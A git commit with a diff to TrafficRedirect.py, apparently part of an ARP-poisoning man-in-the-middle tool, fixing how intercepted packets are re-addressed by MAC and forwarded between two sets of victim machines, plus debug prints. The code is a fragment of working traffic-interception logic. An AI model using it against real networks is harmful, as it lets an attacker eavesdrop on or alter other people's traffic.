a214e7993f598ec18da5990ba3ede8a470d805a2
andreiagaronian <andrei.agaronian@gmail.com>
2019-03-27 11:53:59 +0100

    Traffic redirect index bug fixed (One poison minor fix on source MAC)

--- TrafficRedirect.py
+++ TrafficRedirect.py
@@ -13,6 +13,7 @@ class TrafficRedirect():
         def makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, interface):
             # if source is target 1 then someone from target 2 must be the true reciever
             if pkt[Ether].src in target1MAC:
+                print("Traffic from machine 1")
                 found = False
                 # find true receiver (the mac of true receiver)
                 receiver = pkt[IP].dst
@@ -21,7 +22,7 @@ class TrafficRedirect():
                         # we are the source now cause target 2 thinks we are target 1
                         pkt[Ether].src = pkt[Ether].dst
                         # set the mac of the true receiver (someone from list target2)
-                        pkt[Ether].dst = target2MAC[receiver]
+                        pkt[Ether].dst = target2MAC[i]
                         found = True
                         break
                 # send the packet
@@ -29,12 +30,13 @@ class TrafficRedirect():
                     send(pkt, iface=interface)
             # same but with source target 2
             elif pkt[Ether].src in target2MAC:
+                print("Traffic from machine 2")
                 found = False
                 receiver = pkt[IP].dst
                 for i in range(len(target1)):
                     if receiver == target1[i]:
                         pkt[Ether].src = pkt[Ether].dst
-                        pkt[Ether].dst = target1MAC[receiver]
+                        pkt[Ether].dst = target1MAC[i]
                         found = True
                         break
                 if found:
@@ -43,15 +45,14 @@ class TrafficRedirect():
         def makeFakePacketOneWay(pkt, target2, target1MAC, target2MAC, interface):
             # if source is target 1 then someone from target 2 must be the true receiver
             if pkt[Ether].src in target1MAC:
+                print("Traffic from machine 1")
                 found = False
                 # find true receiver (the mac of true receiver)
                 receiver = pkt[IP].dst
                 for i in range(len(target2)):
                     if receiver == target2[i]:
-                        # we are the source now cause target 2 thinks we are target 1
-                        pkt[Ether].src = pkt[Ether].dst
                         # set the mac of the true receiver (someone from list target2)
-                        pkt[Ether].dst = target2MAC[receiver]
+                        pkt[Ether].dst = target2MAC[i]
                         found = True
                         break
                 # send the packet
